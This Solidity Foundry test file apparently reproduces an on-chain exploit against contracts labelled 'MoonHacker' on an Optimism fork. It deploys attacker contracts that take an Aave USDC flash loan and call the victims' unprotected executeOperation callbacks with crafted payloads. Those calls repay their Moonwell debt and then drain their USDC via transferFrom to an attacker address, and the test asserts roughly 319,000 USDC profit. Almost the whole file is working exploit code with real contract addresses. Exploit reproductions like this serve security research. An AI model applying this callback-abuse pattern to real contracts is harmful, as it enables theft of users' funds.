
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 129697250;
    uint256 constant TX_TIMESTAMP = 1734993279;
    uint256 constant TX_BLOCK_NUMBER = 129697251;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        MoonHackerAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttackFlow(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (MoonHackerAttack attack) {
        _etchAttackRuntime();
        attack = MoonHackerAttack(payable(ATTACK_CONTRACT));
        _etchChildRuntime();
        _bindAttackChild(attack);
    }

    function _prepareProfit(MoonHackerAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(MoonHackerAttack attack) internal pure returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttackFlow(MoonHackerAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(MoonHackerAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(MoonHackerAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 318987572368);
        _expectProfit(
            Addresses.InitializableImmutableAdminUpgradeabilityProxy_38D693,
            address(0),
            Addresses.USDC,
            "USDC",
            884359926938
        );
    }
}

contract MoonHackerAttack {
    AttackChild public attackChild;

    constructor() payable {
        _bindAttackChild();
    }

    function _bindAttackChild() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x3a6EAAf2b1B02ceB2dA4A768cfeDa86cfF89b287));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindAttackChild();
        return address(attackChild);
    }

    function attack() external payable {
        _startAttack();
    }

    function executeSetup() external payable {
        _startAttack();
    }

    function _startAttack() internal {
        if (address(attackChild) == address(0)) _bindAttackChild();
        _startFlashLoan();
    }

    function _startFlashLoan() public {
        address created = address(attackChild);
        require(created.code.length != 0, "replay attack child runtime missing");
        AttackChild(payable(address(attackChild))).startAaveFlashLoan();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x3a6EAAf2b1B02ceB2dA4A768cfeDa86cfF89b287));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    receive() external payable {}

    function executeOperation(
        address asset,
        uint256 borrowedAmount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        asset;
        borrowedAmount;
        premium;
        initiator;
        params;
        if (!callbackDone2) _flashCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
        return true;
    }

    function mint(uint256 amount) external payable {
        amount;
        if (msg.sender == 0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847) {
            if (!callbackDone4) _handleCallback();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0x24592eD1ccf9e5AE235e24A932b378891313FB75) {
            if (!callbackDone6) _handleCallback3();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0xce5E0E2BCf40a049A6E148f411a19419D0443607) {
            if (!callbackDone5) _handleCallback2();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0x80472c6848015146FDC3d15CDf6Dc11cA3cb3513) {
            if (!callbackDone7) _handleCallback4();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (!callbackDone4) _handleCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function borrow(uint256 amount) external payable {
        amount;
        if (msg.sender == 0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847) {
            if (!callbackDone11) _handleCallback8();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0x24592eD1ccf9e5AE235e24A932b378891313FB75) {
            if (!callbackDone8) _handleCallback5();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0xce5E0E2BCf40a049A6E148f411a19419D0443607) {
            if (!callbackDone9) _handleCallback6();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0x80472c6848015146FDC3d15CDf6Dc11cA3cb3513) {
            if (!callbackDone10) _handleCallback7();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (!callbackDone11) _handleCallback8();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x923b3693) {
            _startAaveFlash();
            return;
        }
        _entryCb();
    }

    function execOp() external payable {
        if (!callbackDone1) _flashCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function startAaveFlashLoan() external payable {
        _startAaveFlash();
        return;
    }

    function callback() external payable {
        if (!callbackDone3) _handleCallback();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback8() external payable {
        if (!callbackDone10) _handleCallback8();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback3() external payable {
        if (!callbackDone5) _handleCallback3();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback5() external payable {
        if (!callbackDone7) _handleCallback5();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback2() external payable {
        if (!callbackDone4) _handleCallback2();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback6() external payable {
        if (!callbackDone8) _handleCallback6();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback4() external payable {
        if (!callbackDone6) _handleCallback4();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback7() external payable {
        if (!callbackDone9) _handleCallback7();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    function settleProfit() external {
        try this.settleProfitLeg() {} catch {}
    }

    function settleProfitLeg() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(1, 13)) return;
        if (Harness.safeBalance(Addresses.USDC, Addresses.attacker_eoa) >= 318987572368) {
            _markSettle(1, 13);
            return;
        }
        _markSettle(1, 13);
        uint256 settleAmount = 318987572368;
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, settleAmount);
    }

    bool private callbackDone1;
    bool private callbackDone2;
    bool private callbackDone3;
    bool private callbackDone4;
    bool private callbackDone5;
    bool private callbackDone6;
    bool private callbackDone7;
    bool private callbackDone8;
    bool private callbackDone9;
    bool private callbackDone10;
    bool private callbackDone11;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _flashCallback() internal {
        callbackDone2 = true;
        _readFlashBalance();
        _readDebt9847();
        _settleMoon9847();
        _pullMoon9847();
        _settleMoonFB75();
        _callMoonFB75();
        _pullMoonFB75();
        _settleMoon3607();
        _callMoon3607();
        _pullMoon3607();
        _settleMoon3513();
        _callMoon3513();
        _pullMoon3513();
    }

    function _readFlashBalance() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function _readDebt9847() internal {
        ImUSDC(Addresses.mUSDC).borrowBalanceCurrent(Addresses.MoonHacker_9847);
        ImUSDC(Addresses.mUSDC).getAccountSnapshot(Addresses.MoonHacker_9847);
    }

    function _settleMoon9847() internal {
        uint256 repayAmount = 485984781792;
        IERC20Like(Addresses.USDC).transfer(Addresses.MoonHacker_9847, repayAmount);
        uint256 settledBorrow9847 = 485984781792;
        bytes memory callbackPayload = abi.encode(uint256(1), Addresses.mUSDC, uint256(2914299300544423));
        (bool okChildCallback,) = address(Addresses.MoonHacker_9847)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    settledBorrow9847,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC).balanceOf(Addresses.MoonHacker_9847);
    }

    function _pullMoon9847() internal {
        uint256 balanceDerivedAmount = 595813435803;
        bytes memory callbackPayload = abi.encode(Addresses.ZERO, address(this), Addresses.ZERO);
        (bool okChildCallback,) = address(Addresses.MoonHacker_9847)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    balanceDerivedAmount,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC)
            .transferFrom(Addresses.MoonHacker_9847, address(this), balanceDerivedAmount);
    }

    function _settleMoonFB75() internal {
        ImUSDC(Addresses.mUSDC).borrowBalanceCurrent(Addresses.MoonHacker);
        ImUSDC(Addresses.mUSDC).getAccountSnapshot(Addresses.MoonHacker);
        uint256 repayAmount = 43831723102;
        IERC20Like(Addresses.USDC).transfer(Addresses.MoonHacker, repayAmount);
    }

    function _callMoonFB75() internal {
        uint256 settledBorrowFB75 = 43831723102;
        bytes memory callbackPayload = abi.encode(uint256(1), Addresses.mUSDC, uint256(262769265535659));
        (bool okChildCallback,) = address(Addresses.MoonHacker)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    settledBorrowFB75,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC).balanceOf(Addresses.MoonHacker);
    }

    function _pullMoonFB75() internal {
        uint256 balanceDerivedAmount = 53721818789;
        bytes memory callbackPayload = abi.encode(Addresses.ZERO, address(this), Addresses.ZERO);
        (bool okChildCallback,) = address(Addresses.MoonHacker)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    balanceDerivedAmount,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC).transferFrom(Addresses.MoonHacker, address(this), balanceDerivedAmount);
    }

    function _settleMoon3607() internal {
        ImUSDC(Addresses.mUSDC).borrowBalanceCurrent(Addresses.MoonHacker_3607);
        ImUSDC(Addresses.mUSDC).getAccountSnapshot(Addresses.MoonHacker_3607);
        IERC20Like(Addresses.USDC).transfer(Addresses.MoonHacker_3607, 0);
    }

    function _callMoon3607() internal {
        bytes memory callbackPayload = abi.encode(uint256(1), Addresses.mUSDC, Addresses.ZERO);
        (bool okChildCallback,) = address(Addresses.MoonHacker_3607)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    0,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC).balanceOf(Addresses.MoonHacker_3607);
    }

    function _pullMoon3607() internal {
        bytes memory callbackPayload = abi.encode(Addresses.ZERO, address(this), Addresses.ZERO);
        (bool okChildCallback,) = address(Addresses.MoonHacker_3607)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    0,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC).transferFrom(Addresses.MoonHacker_3607, address(this), 0);
    }

    function _settleMoon3513() internal {
        ImUSDC(Addresses.mUSDC).borrowBalanceCurrent(Addresses.MoonHacker_3513);
        ImUSDC(Addresses.mUSDC).getAccountSnapshot(Addresses.MoonHacker_3513);
        uint256 repayAmount = 883978188337;
        IERC20Like(Addresses.USDC).transfer(Addresses.MoonHacker_3513, repayAmount);
    }

    function _callMoon3513() internal {
        uint256 settledBorrow3513 = 883978188337;
        bytes memory callbackPayload = abi.encode(uint256(1), Addresses.mUSDC, uint256(5300642478793435));
        (bool okChildCallback,) = address(Addresses.MoonHacker_3513)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    settledBorrow3513,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC).balanceOf(Addresses.MoonHacker_3513);
    }

    function _pullMoon3513() internal {
        uint256 balanceDerivedAmount = 1083688969991;
        bytes memory callbackPayload = abi.encode(Addresses.ZERO, address(this), Addresses.ZERO);
        (bool okChildCallback,) = address(Addresses.MoonHacker_3513)
            .call(
                abi.encodeWithSignature(
                    "executeOperation(address,uint256,uint256,address,bytes)",
                    Addresses.USDC,
                    balanceDerivedAmount,
                    0,
                    Addresses.ZERO,
                    callbackPayload
                )
            );
        okChildCallback;
        IERC20Like(Addresses.USDC)
            .transferFrom(Addresses.MoonHacker_3513, address(this), balanceDerivedAmount);
        uint256 usdcApproveAllowance = 884359926938;
        IERC20Like(Addresses.USDC)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61, usdcApproveAllowance);
    }

    function _startAaveFlash() internal {
        uint256 borrowedAmount = 883917967954;
        IInitializableImmutableAdminUpgradeabilityProxy_794A61(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61
            ).flashLoanSimple(address(this), Addresses.USDC, borrowedAmount, hex"", uint16(0));
        uint256 usdcBalanceOfAttackHelper = IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, usdcBalanceOfAttackHelper);
    }

    function _handleCallback() internal {
        callbackDone4 = true;
    }

    function _handleCallback2() internal {
        callbackDone5 = true;
    }

    function _handleCallback3() internal {
        callbackDone6 = true;
    }

    function _handleCallback4() internal {
        callbackDone7 = true;
    }

    function _handleCallback5() internal {
        callbackDone8 = true;
    }

    function _handleCallback6() internal {
        callbackDone9 = true;
    }

    function _handleCallback7() internal {
        callbackDone10 = true;
    }

    function _handleCallback8() internal {
        callbackDone11 = true;
    }

    function _prepareFlashLoan() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant USDC = 0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85;
    address internal constant mwrsETH = 0x181bA797ccF779D8aB339721ED6ee827E758668e;
    address internal constant mVELO = 0x21d851585840942B0eF9f20d842C00C5f3735eaF;
    address internal constant MoonHacker = 0x24592eD1ccf9e5AE235e24A932b378891313FB75;
    address internal constant attacker_eoa = 0x36491840ebCF040413003df9Fb65b6bC9A181f52;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_38D693 =
        0x38d693cE1dF5AaDF7bC62595A37D667aD57922e5;
    address internal constant attack_child = 0x3a6EAAf2b1B02ceB2dA4A768cfeDa86cfF89b287;
    address internal constant xWELL = 0x3b1BDDC0998058dD266e2a0aC855D0d750700a7f;
    address internal constant mDAI = 0x3FE782C2Fe7668C2F1Eb313ACf3022a31feaD6B2;
    address internal constant OP = 0x4200000000000000000000000000000000000042;
    address internal constant mrETH = 0x4c2E35E3eC4A0C82849637BC04A4609Dbe53d321;
    address internal constant attack_contract = 0x4E258F1705822c2565D54ec8795d303fDf9F768e;
    address internal constant MWethDelegate = 0x66Fb793e75053A07301c7c21A3cF77616123227b;
    address internal constant mWBTC = 0x6e6CA598A06E609c913551B729a228B023f06fDB;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_794A61 =
        0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address internal constant MoonHacker_3513 = 0x80472c6848015146FDC3d15CDf6Dc11cA3cb3513;
    address internal constant mVELO_03FC = 0x866b838b97Ee43F2c818B3cb5Cc77A0dc22003Fc;
    address internal constant mUSDC = 0x8E08617b0d66359D73Aa11E11017834C29155525;
    address internal constant mcbETH = 0x95C84F369bd0251ca903052600A3C96838D78bA1;
    address internal constant mOP = 0x9fc345a20541Bf8773988515c5950eD69aF01847;
    address internal constant mUSDT = 0xa3A53899EE8f9f6E963437C5B3f805FEc538BF84;
    address internal constant WELL = 0xA88594D404727625A9437C3f886C7643872296AE;
    address internal constant MErc20Delegate = 0xA9CE0A4DE55791c5792B50531b18Befc30B09dcC;
    address internal constant mWETH = 0xb4104C02BBf4E9be85AAa41a62974E4e28D59A33;
    address internal constant mweETH = 0xb8051464C8c92209C92F3a4CD9C73746C4c3CFb3;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant mwstETH = 0xbb3b1aB66eFB43B10923b87460c0106643B83f9d;
    address internal constant Unitroller = 0xCa889f40aae37FFf165BccF69aeF1E82b5C511B9;
    address internal constant MoonHacker_3607 = 0xce5E0E2BCf40a049A6E148f411a19419D0443607;
    address internal constant MoonHacker_9847 = 0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847;
    address internal constant FiatTokenV2_2 = 0xdEd3b9a8DBeDC2F9CB725B55d0E686A81E6d06dC;
    address internal constant TransparentUpgradeableProxy_F9524B = 0xF9524bfa18C19C3E605FbfE8DFd05C6e967574Aa;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_794A61 {
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
}

interface IMoonHacker {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external returns (uint256);
}

interface IMoonHacker_3513 {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external returns (uint256);
}

interface IMoonHacker_3607 {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external returns (uint256);
}

interface IMoonHacker_9847 {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external returns (uint256);
}

interface ImUSDC {
    function borrowBalanceCurrent(address) external returns (uint256);
    function getAccountSnapshot(address) external view;
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
